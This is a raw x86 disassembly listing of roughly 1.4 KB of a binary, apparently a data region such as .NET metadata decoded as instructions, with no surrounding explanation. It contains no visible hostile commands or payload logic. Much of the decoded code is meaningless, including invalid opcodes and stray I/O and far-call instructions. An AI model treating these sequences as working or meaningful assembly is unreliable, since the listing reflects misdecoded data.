  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	83 21 55             	andl   $0x55,(%ecx)
  4069af:	02 5b 00             	add    0x0(%ebx),%bl
  4069b2:	c0 54 00 00 00       	rclb   $0x0,0x0(%eax,%eax,1)
  4069b7:	00 86 08 9a 25 5a    	add    %al,0x5a259a08(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	93                   	xchg   %eax,%ebx
  4069c9:	0f 5f 02             	maxps  (%edx),%xmm0
  4069cc:	5c                   	pop    %esp
  4069cd:	00 6f 25             	add    %ch,0x25(%edi)
  4069d0:	00 00                	add    %al,(%eax)
  4069d2:	00 00                	add    %al,(%eax)
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	d7                   	xlat   %ds:(%ebx)
  4069d7:	1d 64 02 5c 00       	sbb    $0x5c0264,%eax
  4069dc:	7c 25                	jl     0x406a03
  4069de:	00 00                	add    %al,(%eax)
  4069e0:	00 00                	add    %al,(%eax)
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	0e                   	push   %cs
  4069e5:	1e                   	push   %ds
  4069e6:	0e                   	push   %cs
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 9f 03 b1 02 5c    	add    %bl,0x5c02b103(%edi)
  4069f7:	00 8f 25 00 00 00    	add    %cl,0x25(%edi)
  4069fd:	00 96 00 e3 06 b8    	add    %dl,-0x47f91d00(%esi)
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 e1                	add    %ah,%cl
  406a0f:	03 be 02 5f 00 78    	add    0x78005f02(%esi),%edi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 0e 1e 0e    	add    %al,0xe1e0e18(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 65 07             	add    %ah,0x7(%ebp)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 bf 1b cb 02 62    	add    %bh,0x6202cb1b(%edi)
  406a3d:	00 cc                	add    %cl,%ah
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 9a 08 d2 02 64    	add    %bl,0x6402d208(%edx)
  406a4b:	00 ab 25 00 00 00    	add    %ch,0x25(%ebx)
  406a51:	00 96 00 62 09 da    	add    %dl,-0x25f69e00(%esi)
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 ff                	add    %bh,%bh
  406a63:	08 e1                	or     %ah,%cl
  406a65:	02 68 00             	add    0x0(%eax),%ch
  406a68:	e6 25                	out    %al,$0x25
  406a6a:	00 00                	add    %al,(%eax)
  406a6c:	00 00                	add    %al,(%eax)
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 7e 07             	add    %bh,0x7(%esi)
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 5a 07             	add    %bl,0x7(%edx)
  406a80:	ef                   	out    %eax,(%dx)
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 bf 09 f6 02 6e    	add    %bh,0x6e02f609(%edi)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	0e                   	push   %cs
  406a9b:	1e                   	push   %ds
  406a9c:	0e                   	push   %cs
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 e0                	add    %ah,%al
  406aa9:	14 84                	adc    $0x84,%al
  406aab:	01 70 00             	add    %esi,0x0(%eax)
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 99 16 84 01 71    	add    %bl,0x71018416(%ecx)
  406abb:	00 00                	add    %al,(%eax)
  406abd:	00 01                	add    %al,(%ecx)
  406abf:	00 45 06             	add    %al,0x6(%ebp)
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	65 1e                	gs push %ds
  406ac8:	00 00                	add    %al,(%eax)
  406aca:	01 00                	add    %eax,(%eax)
  406acc:	85 05 00 00 01 00    	test   %eax,0x10000
  406ad2:	9a 07 00 00 01 00 8c 	lcall  $0x8c00,$0x1000007
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 78 02             	add    %bh,0x2(%eax)
  406ae0:	00 00                	add    %al,(%eax)
  406ae2:	01 00                	add    %eax,(%eax)
  406ae4:	70 08                	jo     0x406aee
  406ae6:	00 00                	add    %al,(%eax)
  406ae8:	01 00                	add    %eax,(%eax)
  406aea:	f2 04 00             	repnz add $0x0,%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 2a                	add    %ch,(%edx)
  406af1:	09 00                	or     %eax,(%eax)
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 48 09             	add    %cl,0x9(%eax)
  406af8:	00 00                	add    %al,(%eax)
  406afa:	01 00                	add    %eax,(%eax)
  406afc:	be 08 00 00 01       	mov    $0x1000008,%esi
  406b01:	00 5a 02             	add    %bl,0x2(%edx)
  406b04:	00 00                	add    %al,(%eax)
  406b06:	02 00                	add    (%eax),%al
  406b08:	28 0b                	sub    %cl,(%ebx)
  406b0a:	00 00                	add    %al,(%eax)
  406b0c:	03 00                	add    (%eax),%eax
  406b0e:	9d                   	popf
  406b0f:	20 00                	and    %al,(%eax)
  406b11:	00 04 00             	add    %al,(%eax,%eax,1)
  406b14:	42                   	inc    %edx
  406b15:	07                   	pop    %es
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	f3 12 00             	repz adc (%eax),%al
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 e7                	add    %ah,%bh
  406b21:	15 00 00 01 00       	adc    $0x10000,%eax
  406b26:	d5 17                	aad    $0x17
  406b28:	00 00                	add    %al,(%eax)
  406b2a:	01 00                	add    %eax,(%eax)
  406b2c:	21 04 00             	and    %eax,(%eax,%eax,1)
  406b2f:	00 01                	add    %al,(%ecx)
  406b31:	00 96 17 00 00 01    	add    %dl,0x1000017(%esi)
  406b37:	00 4d 03             	add    %cl,0x3(%ebp)
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	9e                   	sahf
  406b3f:	04 00                	add    $0x0,%al
  406b41:	00 02                	add    %al,(%edx)
  406b43:	00 4d 07             	add    %cl,0x7(%ebp)
  406b46:	00 00                	add    %al,(%eax)
  406b48:	03 00                	add    (%eax),%eax
  406b4a:	58                   	pop    %eax
  406b4b:	04 00                	add    $0x0,%al
  406b4d:	00 01                	add    %al,(%ecx)
  406b4f:	00 fc                	add    %bh,%ah
  406b51:	05 00 00 01 00       	add    $0x10000,%eax
  406b56:	d5 03                	aad    $0x3
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	02 00                	add    (%eax),%al
  406b5c:	6d                   	insl   (%dx),%es:(%edi)
  406b5d:	0a 00                	or     (%eax),%al
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 dd                	add    %bl,%ch
  406b63:	1b 00                	sbb    (%eax),%eax
  406b65:	00 01                	add    %al,(%ecx)
  406b67:	00 dd                	add    %bl,%ch
  406b69:	26 00 00             	add    %al,%es:(%eax)
  406b6c:	02 00                	add    (%eax),%al
  406b6e:	07                   	pop    %es
  406b6f:	1c 00                	sbb    $0x0,%al
  406b71:	00 03                	add    %al,(%ebx)
  406b73:	00 c3                	add    %al,%bl
  406b75:	21 00                	and    %eax,(%eax)
  406b77:	00 01                	add    %al,(%ecx)
  406b79:	00 cc                	add    %cl,%ah
  406b7b:	15 00 00 02 00       	adc    $0x20000,%eax
  406b80:	ab                   	stos   %eax,%es:(%edi)
  406b81:	15 00 00 01 00       	adc    $0x10000,%eax
  406b86:	3b 25 00 00 02 00    	cmp    0x20000,%esp
  406b8c:	28 07                	sub    %al,(%edi)
  406b8e:	00 00                	add    %al,(%eax)
  406b90:	01 00                	add    %eax,(%eax)
  406b92:	ff 02                	incl   (%edx)
  406b94:	00 00                	add    %al,(%eax)
  406b96:	01 00                	add    %eax,(%eax)
  406b98:	27                   	daa
  406b99:	03 00                	add    (%eax),%eax
  406b9b:	00 01                	add    %al,(%ecx)
  406b9d:	00 3b                	add    %bh,(%ebx)
  406b9f:	13 00                	adc    (%eax),%eax
  406ba1:	00 01                	add    %al,(%ecx)
  406ba3:	00 a7 09 00 00 01    	add    %ah,0x1000009(%edi)
  406ba9:	00 35 15 00 00 01    	add    %dh,0x1000015
  406baf:	00 4d 05             	add    %cl,0x5(%ebp)
  406bb2:	00 00                	add    %al,(%eax)
  406bb4:	01 00                	add    %eax,(%eax)
  406bb6:	59                   	pop    %ecx
  406bb7:	03 00                	add    (%eax),%eax
  406bb9:	00 01                	add    %al,(%ecx)
  406bbb:	00 73 1e             	add    %dh,0x1e(%ebx)
  406bbe:	00 00                	add    %al,(%eax)
  406bc0:	01 00                	add    %eax,(%eax)
  406bc2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406bc3:	00 00                	add    %al,(%eax)
  406bc5:	00 01                	add    %al,(%ecx)
  406bc7:	00 2c 08             	add    %ch,(%eax,%ecx,1)
  406bca:	00 00                	add    %al,(%eax)
  406bcc:	01 00                	add    %eax,(%eax)
  406bce:	89 1b                	mov    %ebx,(%ebx)
  406bd0:	00 00                	add    %al,(%eax)
  406bd2:	02 00                	add    (%eax),%al
  406bd4:	c2 00 00             	ret    $0x0
  406bd7:	00 01                	add    %al,(%ecx)
  406bd9:	00 8a 06 00 00 01    	add    %cl,0x1000006(%edx)
  406bdf:	00 03                	add    %al,(%ebx)
  406be1:	13 00                	adc    (%eax),%eax
  406be3:	00 01                	add    %al,(%ecx)
  406be5:	00 1b                	add    %bl,(%ebx)
  406be7:	19 00                	sbb    %eax,(%eax)
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 e4                	add    %ah,%ah
  406bed:	0c 00                	or     $0x0,%al
  406bef:	00 01                	add    %al,(%ecx)
  406bf1:	00 a2 14 00 00 01    	add    %ah,0x1000014(%edx)
  406bf7:	00 d1                	add    %dl,%cl
  406bf9:	1b 00                	sbb    (%eax),%eax
  406bfb:	00 01                	add    %al,(%ecx)
  406bfd:	00 8b 16 00 00 01    	add    %cl,0x1000016(%ebx)
  406c03:	00 45 08             	add    %al,0x8(%ebp)
  406c06:	00 00                	add    %al,(%eax)
  406c08:	01 00                	add    %eax,(%eax)
  406c0a:	7a 06                	jp     0x406c12
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	a2 02 00 00 01       	mov    %al,0x1000002
  406c15:	00 cc                	add    %cl,%ah
  406c17:	0d 00 00 01 00       	or     $0x10000,%eax
  406c1c:	0e                   	push   %cs
  406c1d:	24 00                	and    $0x0,%al
  406c1f:	00 01                	add    %al,(%ecx)
  406c21:	00 25 02 00 00 02    	add    %ah,0x2000002
  406c27:	00 0b                	add    %cl,(%ebx)
  406c29:	03 00                	add    (%eax),%eax
  406c2b:	00 01                	add    %al,(%ecx)
  406c2d:	00 1f                	add    %bl,(%edi)
  406c2f:	08 00                	or     %al,(%eax)
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 53 15             	add    %dl,0x15(%ebx)
  406c36:	00 00                	add    %al,(%eax)
  406c38:	01 00                	add    %eax,(%eax)
  406c3a:	4a                   	dec    %edx
  406c3b:	02 00                	add    (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 17                	add    %dl,(%edi)
  406c41:	03 00                	add    (%eax),%eax
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 1f                	add    %bl,(%edi)
  406c47:	13 00                	adc    (%eax),%eax
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 0c 0d 00 00 01 00 	add    %cl,0x10000(,%ecx,1)
  406c52:	56                   	push   %esi
  406c53:	13 00                	adc    (%eax),%eax
  406c55:	00 01                	add    %al,(%ecx)
  406c57:	00 ec                	add    %ch,%ah
  406c59:	05 00 00 01 00       	add    $0x10000,%eax
  406c5e:	48                   	dec    %eax
  406c5f:	21 00                	and    %eax,(%eax)
  406c61:	00 01                	add    %al,(%ecx)
  406c63:	00 08                	add    %cl,(%eax)
  406c65:	20 00                	and    %al,(%eax)
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 b0 26 00 00 01    	add    %dh,0x1000026(%eax)
  406c6f:	00 de                	add    %bl,%dh
  406c71:	05 00 00 01 00       	add    $0x10000,%eax
  406c76:	8b 1e                	mov    (%esi),%ebx
  406c78:	00 00                	add    %al,(%eax)
  406c7a:	02 00                	add    (%eax),%al
  406c7c:	53                   	push   %ebx
  406c7d:	0a 00                	or     (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 e3                	add    %ah,%bl
  406c83:	02 00                	add    (%eax),%al
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 7b 01             	add    %bh,0x1(%ebx)
  406c8a:	00 00                	add    %al,(%eax)
  406c8c:	01 00                	add    %eax,(%eax)
  406c8e:	45                   	inc    %ebp
  406c8f:	15 00 00 01 00       	adc    $0x10000,%eax
  406c94:	95                   	xchg   %eax,%ebp
  406c95:	1d 00 00 01 00       	sbb    $0x10000,%eax
  406c9a:	12 13                	adc    (%ebx),%dl
  406c9c:	00 00                	add    %al,(%eax)
  406c9e:	01 00                	add    %eax,(%eax)
  406ca0:	1b 0a                	sbb    (%edx),%ecx
  406ca2:	00 00                	add    %al,(%eax)
  406ca4:	01 00                	add    %eax,(%eax)
  406ca6:	36 05 00 00 01 00    	ss add $0x10000,%eax
  406cac:	ef                   	out    %eax,(%dx)
  406cad:	0c 00                	or     $0x0,%al
  406caf:	00 01                	add    %al,(%ecx)
  406cb1:	00 a8 16 00 00 01    	add    %ch,0x1000016(%eax)
  406cb7:	00 9c 18 00 00 01 00 	add    %bl,0x10000(%eax,%ebx,1)
  406cbe:	06                   	push   %es
  406cbf:	25 00 00 01 00       	and    $0x10000,%eax
  406cc4:	c9                   	leave
  406cc5:	03 00                	add    (%eax),%eax
  406cc7:	00 01                	add    %al,(%ecx)
  406cc9:	00 f0                	add    %dh,%al
  406ccb:	17                   	pop    %ss
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	68 02 00 00 01       	push   $0x1000002
  406cd5:	00 48 13             	add    %cl,0x13(%eax)
  406cd8:	00 00                	add    %al,(%eax)
  406cda:	01 00                	add    %eax,(%eax)
  406cdc:	d6                   	salc
  406cdd:	06                   	push   %es
  406cde:	00 00                	add    %al,(%eax)
  406ce0:	01 00                	add    %eax,(%eax)
  406ce2:	7f 1a                	jg     0x406cfe
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	d6                   	salc
  406ce9:	09 00                	or     %eax,(%eax)
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 d8                	add    %bl,%al
  406cef:	08 00                	or     %al,(%eax)
  406cf1:	00 01                	add    %al,(%ecx)
  406cf3:	00 4f 01             	add    %cl,0x1(%edi)
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	78 03                	js     0x406cff
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	01 00                	add    %eax,(%eax)
  406d00:	7b 0a                	jnp    0x406d0c
  406d02:	00 00                	add    %al,(%eax)
  406d04:	01 00                	add    %eax,(%eax)
  406d06:	98                   	cwtl
  406d07:	24 00                	and    $0x0,%al
  406d09:	00 02                	add    %al,(%edx)
  406d0b:	00 48 24             	add    %cl,0x24(%eax)
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	02 24 00             	add    (%eax,%eax,1),%ah
  406d15:	00 02                	add    %al,(%edx)
  406d17:	00 a4 06 00 00 01 00 	add    %ah,0x10000(%esi,%eax,1)
  406d1e:	96                   	xchg   %eax,%esi
  406d1f:	06                   	push   %es
  406d20:	00 00                	add    %al,(%eax)
  406d22:	02 00                	add    (%eax),%al
  406d24:	1e                   	push   %ds
  406d25:	24 00                	and    $0x0,%al
  406d27:	00 01                	add    %al,(%ecx)
  406d29:	00 73 07             	add    %dh,0x7(%ebx)
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	58                   	pop    %eax
  406d31:	1e                   	push   %ds
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	f1                   	int1
  406d37:	09 00                	or     %eax,(%eax)
  406d39:	00 02                	add    %al,(%edx)
  406d3b:	00 1d 09 00 00 01    	add    %bl,0x1000009
  406d41:	00 da                	add    %bl,%dl
  406d43:	07                   	pop    %es
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	e6 01                	out    %al,$0x1
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	cd 08                	int    $0x8
  406d50:	00 00                	add    %al,(%eax)
  406d52:	02 00                	add    (%eax),%al
  406d54:	4a                   	dec    %edx
  406d55:	1e                   	push   %ds
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	e8 25 00 00 01       	call   0x1406d84
  406d5f:	00 a5 08 16 00 59    	add    %ah,0x59001608(%ebp)
  406d65:	00 18                	add    %bl,(%eax)
  406d67:	00 5d 00             	add    %bl,0x0(%ebp)
  406d6a:	b1 00                	mov    $0x0,%cl
  406d6c:	d9 22                	fldenv (%edx)
  406d6e:	bb 01 b1 00 df       	mov    $0xdf00b101,%ebx
  406d73:	23 bf 01 b1 00 00    	and    0xb101(%edi),%edi
  406d79:	22 0e                	and    (%esi),%cl
  406d7b:	00 b9 00 f6 1d 64    	add    %bh,0x641df600(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 0e                	add    %cl,(%esi)
  406d85:	1e                   	push   %ds
  406d86:	01 03                	add    %eax,(%ebx)
  406d88:	d1 00                	roll   $1,(%eax)
  406d8a:	0e                   	push   %cs
  406d8b:	1e                   	push   %ds
  406d8c:	0e                   	push   %cs
  406d8d:	00 d9                	add    %bl,%cl
  406d8f:	00 0e                	add    %cl,(%esi)
  406d91:	1e                   	push   %ds
  406d92:	2e 03 e9             	cs add %ecx,%ebp
  406d95:	00 0e                	add    %cl,(%esi)
  406d97:	1e                   	push   %ds
  406d98:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  406d9b:	00 0e                	add    %cl,(%esi)
  406d9d:	1e                   	push   %ds
  406d9e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  406da1:	00 0e                	add    %cl,(%esi)
  406da3:	1e                   	push   %ds
  406da4:	6b 01 01             	imul   $0x1,(%ecx),%eax
  406da7:	01 0e                	add    %ecx,(%esi)
  406da9:	1e                   	push   %ds
  406daa:	6b 01 09             	imul   $0x9,(%ecx),%eax
  406dad:	01 0e                	add    %ecx,(%esi)
  406daf:	1e                   	push   %ds
  406db0:	6b 01 11             	imul   $0x11,(%ecx),%eax
  406db3:	01 0e                	add    %ecx,(%esi)
  406db5:	1e                   	push   %ds
  406db6:	6b 01 19             	imul   $0x19,(%ecx),%eax
  406db9:	01 0e                	add    %ecx,(%esi)
  406dbb:	1e                   	push   %ds
  406dbc:	6b 01 21             	imul   $0x21,(%ecx),%eax
  406dbf:	01 0e                	add    %ecx,(%esi)
  406dc1:	1e                   	push   %ds
  406dc2:	6b 01 29             	imul   $0x29,(%ecx),%eax
  406dc5:	01 0e                	add    %ecx,(%esi)
  406dc7:	1e                   	push   %ds
  406dc8:	6b 01 31             	imul   $0x31,(%ecx),%eax
  406dcb:	01 0e                	add    %ecx,(%esi)
  406dcd:	1e                   	push   %ds
  406dce:	4b                   	dec    %ebx
  406dcf:	02 39                	add    (%ecx),%bh
  406dd1:	01 0e                	add    %ecx,(%esi)
  406dd3:	1e                   	push   %ds
  406dd4:	0e                   	push   %cs
  406dd5:	00 41 01             	add    %al,0x1(%ecx)
  406dd8:	0e                   	push   %cs
  406dd9:	1e                   	push   %ds
  406dda:	6b 01 49             	imul   $0x49,(%ecx),%eax
  406ddd:	01 83 1b 7f 00 51    	add    %eax,0x51007f1b(%ebx)
  406de3:	01 4c 00 c4          	add    %ecx,-0x3c(%eax,%eax,1)
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	22 22                	and    (%edx),%ah
  406dec:	7f 00                	jg     0x406dee
  406dee:	51                   	push   %ecx
  406def:	01 37                	add    %esi,(%edi)
  406df1:	19 84 00 09 00 0e 1e 	sbb    %eax,0x1e0e0009(%eax,%eax,1)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	92                   	xchg   %eax,%edx
  406dfd:	00 cd                	add    %cl,%ch
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	fb                   	sti
  406e03:	13 2a                	adc    (%edx),%ebp
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	4d                   	dec    %ebp
  406e09:	14 d3                	adc    $0xd3,%al
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 0e                	add    %cl,(%esi)
  406e0f:	1e                   	push   %ds
  406e10:	2b 02                	sub    (%edx),%eax
  406e12:	11 00                	adc    %eax,(%eax)
  406e14:	ce                   	into
  406e15:	25 d9 03 69 01       	and    $0x16903d9,%eax
  406e1a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406e1b:	25 df 03 61 01       	and    $0x16103df,%eax
  406e20:	b6 1f                	mov    $0x1f,%dh
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 c0 01 c7 00    	addl   $0xc701c0,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	fa                   	cli
  406e2d:	14 eb                	adc    $0xeb,%al
  406e2f:	03 19                	add    (%ecx),%ebx
  406e31:	00 0e                	add    %cl,(%esi)
  406e33:	1e                   	push   %ds
  406e34:	09 04 19             	or     %eax,(%ecx,%ebx,1)
  406e37:	00 84 12 01 03 19 00 	add    %al,0x190301(%edx,%edx,1)
  406e3e:	71 12                	jno    0x406e52
  406e40:	01 03                	add    %eax,(%ebx)
  406e42:	c1 01 64             	roll   $0x64,(%ecx)
  406e45:	26 16                	es push %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 1c 22             	add    %ebx,(%edx,%eiz,1)
  406e4c:	1c 04                	sbb    $0x4,%al
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	0e                   	push   %cs
  406e51:	1e                   	push   %ds
  406e52:	0e                   	push   %cs
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 e3                	add    %esp,%ebx
  406e57:	23 23                	and    (%ebx),%esp
  406e59:	04 d9                	add    $0xd9,%al
  406e5b:	01 57 1f             	add    %edx,0x1f(%edi)
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 ac 21 30 04 19 00 	add    %ch,0x190430(%ecx,%eiz,1)
  406e68:	72 0b                	jb     0x406e75
  406e6a:	bf 01 19 00 ac       	mov    $0xac001901,%edi
  406e6f:	21 3c 02             	and    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 0e                	add    %ecx,(%esi)
  406e75:	1e                   	push   %ds
  406e76:	0e                   	push   %cs
  406e77:	00 a1 01 0e 1e 36    	add    %ah,0x361e0e01(%ecx)
  406e7d:	02 99 01 31 20 38    	add    0x38203101(%ecx),%bl
  406e83:	04 99                	add    $0x99,%al
  406e85:	01 1b                	add    %ebx,(%ebx)
  406e87:	14 70                	adc    $0x70,%al
  406e89:	01 c1                	add    %eax,%ecx
  406e8b:	01 1c 22             	add    %ebx,(%edx,%eiz,1)
  406e8e:	3f                   	aas
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 e3                	add    %esp,%ebx
  406e93:	23 49 04             	and    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 dd                	add    %ebx,%ebp
  406e99:	0f 0e                	femms
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 0e                	add    %ecx,(%esi)
  406e9f:	1e                   	push   %ds
  406ea0:	4f                   	dec    %edi
  406ea1:	04 01                	add    $0x1,%al
  406ea3:	02 0e                	add    (%esi),%cl
  406ea5:	1e                   	push   %ds
  406ea6:	56                   	push   %esi
  406ea7:	04 21                	add    $0x21,%al
  406ea9:	00 0e                	add    %cl,(%esi)
  406eab:	1e                   	push   %ds
  406eac:	5c                   	pop    %esp
  406ead:	04 19                	add    $0x19,%al
  406eaf:	00 18                	add    %bl,(%eax)
  406eb1:	23 66 04             	and    0x4(%esi),%esp
  406eb4:	09 00                	or     %eax,(%eax)
  406eb6:	2a 14 47             	sub    (%edi,%eax,2),%dl
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 87 22 6c 04 29    	add    %al,0x29046c22(%edi)
  406ec1:	02 0e                	add    (%esi),%cl
  406ec3:	1e                   	push   %ds
  406ec4:	56                   	push   %esi
  406ec5:	04 29                	add    $0x29,%al
  406ec7:	00 0e                	add    %cl,(%esi)
  406ec9:	1e                   	push   %ds
  406eca:	78 04                	js     0x406ed0
  406ecc:	31 02                	xor    %eax,(%edx)
  406ece:	0e                   	push   %cs
  406ecf:	1e                   	push   %ds
  406ed0:	56                   	push   %esi
  406ed1:	04 c1                	add    $0xc1,%al
  406ed3:	00 4a 0b             	add    %cl,0xb(%edx)
  406ed6:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406eda:	38 0f                	cmp    %cl,(%edi)
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 41 20             	add    %al,0x20(%ecx)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 dd                	add    %bl,%ch
  406ee7:	0f 0e                	femms
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 dd                	add    %bl,%ch
  406eed:	0f 0e                	femms
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 dd                	add    %bl,%ch
  406ef3:	0f 0e                	femms
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 42 0b             	add    %al,0xb(%edx)
  406efa:	a1 04 49 02 4c       	mov    0x4c024904,%eax
  406eff:	00 a7 04 c1 00 4f    	add    %ah,0x4f00c104(%edi)
  406f05:	0b ae 04 51 02 0e    	or     0xe025104(%esi),%ebp
  406f0b:	1e                   	push   %ds
  406f0c:	56                   	push   %esi
  406f0d:	04 49                	add    $0x49,%al
  406f0f:	01 0e                	add    %ecx,(%esi)
  406f11:	1e                   	push   %ds
  406f12:	b6 04                	mov    $0x4,%dh
  406f14:	49                   	dec    %ecx
  406f15:	01 76 23             	add    %esi,0x23(%esi)
  406f18:	bd 04 61 02 7a       	mov    $0x7a026104,%ebp
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	b6 1f                	mov    $0x1f,%dh
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 91 17 d6 04 c1    	add    %dl,-0x3efb29e9(%ecx)
  406f2d:	00 35 10 de 04 59    	add    %dh,0x5904de10
  406f33:	02 0e                	add    (%esi),%cl
  406f35:	1e                   	push   %ds
  406f36:	2b 02                	sub    (%edx),%eax
  406f38:	c1 00 33             	roll   $0x33,(%eax)
  406f3b:	1a 15 02 c1 00 05    	sbb    0x500c102,%dl
  406f41:	15 0e 00 61 02       	adc    $0x261000e,%eax
  406f46:	22 22                	and    (%edx),%ah
  406f48:	9a 00 71 02 a4 21 0a 	lcall  $0xa21,$0xa4027100
